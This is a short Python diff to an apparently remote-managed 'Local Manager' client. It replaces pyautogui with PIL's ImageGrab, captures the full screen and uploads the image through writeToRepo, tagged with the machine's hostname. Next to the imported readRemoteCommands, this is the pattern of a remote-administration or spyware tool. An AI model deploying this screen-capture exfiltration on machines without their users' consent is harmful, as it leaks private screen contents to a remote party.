@@ -1,11 +1,14 @@
 # Local Manager: Executing initial tasks on local machine
-import pyautogui
-import os
+from modules.repomanager import readRemoteCommands, writeToRepo
+import platform
+from PIL import ImageGrab
 
 
+# BRON SCREENSHOT MAKEN
+# https://nitratine.net/blog/post/how-to-take-a-screenshot-in-python-using-pil/
 def Screenshot():
-    ss = pyautogui.screenshot()
-    cd = os.getcwd()
-    print(cd)  # Check if the path it
-    # specifying is correct
-    ss.save(cd + "../Screenshot.png")
+    filepath = "screenshot.png"
+    screenshot = ImageGrab.grab()
+    screenshot.save(filepath, "PNG")
+    print(platform.node())
+    writeToRepo(filepath, platform.node())
